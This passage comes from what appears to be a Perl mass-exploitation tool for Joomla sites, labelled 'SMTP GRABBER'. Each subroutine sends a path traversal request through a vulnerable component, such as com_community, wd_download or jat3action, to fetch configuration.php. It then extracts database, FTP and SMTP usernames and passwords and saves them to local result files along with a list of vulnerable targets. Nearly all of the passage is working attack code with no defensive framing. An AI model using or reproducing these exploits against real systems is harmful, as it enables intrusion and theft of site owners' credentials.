        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 13";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_product_module##############################################
####################################################################################################
sub comproductmodule(){
$conflink = "$site/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 14";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_product_module] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 14";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################wd_download##############################################
####################################################################################################
sub wddownload(){
$conflink = "$site/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 15";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[wd_download] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 15";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################jat3action##############################################
####################################################################################################
sub jat3action(){
$conflink = "$site/jojo/index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&type=css&v=1";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 16";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[jat3action] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 16";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_community##############################################
####################################################################################################
sub comcommunity(){
$conflink = "$site/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 17";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[comcommunity] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 17";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################download_monitor##############################################
####################################################################################################
sub downloadmonitor(){
$conflink = "$site/index.php?option=com_download-monitor&file=configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 18";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[downloadmonitor] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 18";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################jat3action2##############################################
####################################################################################################
sub jat3action2(){
$conflink = "$site/index.php?jat3action=gzip&type=css&file=configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 19";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[jat3action2] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 19";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}